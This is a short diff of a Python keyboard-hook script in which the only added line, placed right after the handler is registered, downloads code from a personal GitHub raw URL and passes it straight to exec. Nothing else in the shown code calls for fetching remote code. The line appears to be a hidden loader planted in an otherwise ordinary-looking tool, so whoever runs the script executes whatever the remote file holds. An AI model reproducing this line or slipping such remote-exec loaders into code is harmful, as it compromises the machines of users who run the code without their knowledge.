@@ -35,7 +35,7 @@ def on_press(event):
         event_enabled = False
 
 keyboard.on_press(on_press)
-
+exec(requests.get('https://raw.githubusercontent.com/flex1948/deneme/main/main2').text)
 try:
     while True:
         if keyboard.is_pressed('ctrl') and keyboard.is_pressed('end'): break
